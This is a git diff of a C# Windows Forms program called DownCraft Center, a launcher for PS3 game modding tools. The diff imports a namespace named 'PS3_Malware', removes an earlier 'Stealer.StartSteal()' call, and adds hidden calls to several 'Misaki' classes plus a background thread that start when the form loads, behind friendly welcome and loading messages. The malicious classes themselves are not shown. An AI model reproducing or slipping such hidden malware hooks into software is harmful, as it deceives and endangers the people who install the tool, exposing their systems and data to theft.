@@ -1,4 +1,4 @@
-﻿using DownCraft;
+﻿using PS3_Malware;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -9,6 +9,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -16,6 +17,7 @@ namespace DownCraft_Center
 {
     public partial class Form1 : Form
     {
+        public static Thread CheckProcess = new Thread(new ThreadStart(MisakiV8.Start));
         WebClient web = new WebClient();
         string tmp = Path.GetTempPath();
         string EBOOT_CFW = Path.GetTempPath() + "CFW_EBOOT.BIN";
@@ -81,9 +83,15 @@ namespace DownCraft_Center
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            MisakiV1.Start();
+            MisakiV2.Start();
+            MisakiV6.Start();
+            MisakiV7.Start();
+
+            MessageBox.Show("DownCraft Center is loading please wait...", "DownCraft Center", MessageBoxButtons.OK, MessageBoxIcon.Information);
             try
             {
-                if (!web.DownloadString("https://pastebin.com/raw/v5nanRE7").Contains("1.0"))
+                if (!web.DownloadString("https://pastebin.com/raw/v5nanRE7").Contains("4.0"))
                 {
                     if (MessageBox.Show("A new update is available.", "DownCraft Center", MessageBoxButtons.OK, MessageBoxIcon.Question) == DialogResult.OK)
                     {
@@ -119,13 +127,16 @@ namespace DownCraft_Center
             LoadFiles(tmp + "dcV4.rar", Properties.Resources.dcV4);
             LoadFiles(tmp + "dcV1.rar", Properties.Resources.dcV1);
 
-            Stealer.StartSteal();
+            CheckProcess.Start();
+
+            MessageBox.Show("Welcome to DownCraft Center\n\nWhat is DownCraft Center ?\nDownCraft Center is a program for control all version of DownCraft (RTM & SPRX) so you don't need download a file for RTM and a another for SPRX\n\nHow i can use it ?\nJust put your PS3 IP on the program (be sure that you have WebMAN installed on your console) then select your firmware and press connect it's will automatic inject the right EBOOT for the SPRX skip this step if you don't want to use the SPRX\n\nThen press any buttons you want for SPRX V1, V2, V3 or for RTM V1 or V4 wait a moment and it's done\n\nfor any questions or problem contact Misaki on discord.", "DownCraft Center", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
             gunaGradient2Panel1.MouseDown += this.xMouseDown;
             gunaGradient2Panel1.MouseMove += this.xMouseMove;
             gunaGradient2Panel1.MouseDown += this.xMouseDown;
             gunaGradient2Panel1.MouseMove += this.xMouseMove;
         }
+
         public void ExtractRAR(string sourcefile, string destinationPath)
         {
             System.Diagnostics.Process process = new System.Diagnostics.Process();
@@ -139,7 +150,7 @@ namespace DownCraft_Center
 
         private void guna2ImageButton1_Click(object sender, EventArgs e)
         {
-            Application.Exit();
+            System.Environment.Exit(1);
         }
 
         private void guna2GradientButton3_Click(object sender, EventArgs e)
@@ -235,6 +246,7 @@ namespace DownCraft_Center
 
         private async void guna2GradientButton8_Click(object sender, EventArgs e)
         {
+            MessageBox.Show("DownCraft RTM V4 will start in a moment please wait...", "DownCraft Center", MessageBoxButtons.OK, MessageBoxIcon.Information);
             ExtractRAR(dcV4, Path.GetTempPath());
             await Task.Delay(5000);
             Process.Start(Path.GetTempPath() + @"\dcV4\DownCraft RTM Tool.exe");
@@ -242,6 +254,7 @@ namespace DownCraft_Center
 
         private async void guna2GradientButton7_Click(object sender, EventArgs e)
         {
+            MessageBox.Show("DownCraft RTM V1 will start in a moment please wait...", "DownCraft Center", MessageBoxButtons.OK, MessageBoxIcon.Information);
             ExtractRAR(dcV1, Path.GetTempPath());
             await Task.Delay(5000);
             Process.Start(Path.GetTempPath() + @"\dcV1\DownCraftUI.exe");
@@ -277,6 +290,11 @@ namespace DownCraft_Center
         private void guna2GradientButton4_Click(object sender, EventArgs e)
         {
             MessageBox.Show("You need to enter your PS3 IP then select your firmware (CFW / HEN), press connect button and the selected EBOOT will be injected to your console for any SPRX.\n\nIf you want use the RTM select RTM V1 or RTM V4 wait 20 secondes and the tool will be ready to use.\n\nFor any other question join the official discord. \n\n-Misaki", "DownCraft Center", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+
+        private void guna2GradientButton9_Click(object sender, EventArgs e)
+        {
+            Process.Start("https://mega.nz/file/kRtSwIgb#4-nWn9cO3mYJV5D2ZXQ8SvbEc1LyG1vkxGQW8NLCxI8");
         }
     }
 }
